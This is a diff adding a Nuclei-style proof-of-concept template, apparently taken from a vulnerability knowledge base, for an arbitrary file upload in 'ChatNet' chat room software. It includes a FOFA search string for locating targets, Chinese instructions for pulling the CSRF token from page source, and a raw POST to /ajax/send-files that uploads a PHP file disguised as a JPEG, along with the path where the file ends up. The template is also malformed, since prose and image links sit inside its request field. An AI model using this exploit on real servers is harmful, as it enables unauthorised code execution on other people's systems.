@@ -1,0 +1,70 @@
+id: poc-sgfxsi8ge6pg1g6g
+info:
+  name: ChatNet聊天室send-file任意⽂件上传漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/sgfxsi8ge6pg1g6g'
+  tags: other,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: sgfxsi8ge6pg1g6g
+    fofa: body="/static/vendor/toastr/toastr.min.css"
+http:
+- raw:
+  - '的CSRF Token 在⽹站⾸⻚就能获取到，直接Ctrl+U 查看⽹站源码，然后搜索Token 即可获取到
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1745575308586-bbb64068-f01d-4c20-bb03-62fb5f937b82.png)
+
+    POST /ajax/send-files HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (
+
+    KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundarywTK0blfV
+
+    OgFIlHoB
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,i
+
+    mage/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
+
+    Cookie: PHPSESSID=d8abovre4i5vekn4kqa6o3fhpg;
+
+    Connection: close
+
+    Content-Length: 339
+
+
+    ------WebKitFormBoundarywTK0blfVOgFIlHoB
+
+    Content-Disposition: form-data; name="csrftoken"
+
+
+    I/L/UQ88VVaVOdp8LAqhv/Au0s3Bpb3jMb9/xYCzCmg=
+
+    ------WebKitFormBoundarywTK0blfVOgFIlHoB
+
+    Content-Disposition: form-data; name="file[]"; filename="1.php"
+
+    Content-Type: image/jpeg
+
+
+    <?php phpinfo();?>
+
+    ------WebKitFormBoundarywTK0blfVOgFIlHoB--
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1745575308811-2fc55aff-779c-44df-bcb6-a5cc9bc7751c.png)
+
+    ⽂件是上传路径：http://IP/media/chats/files/xxx.php'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
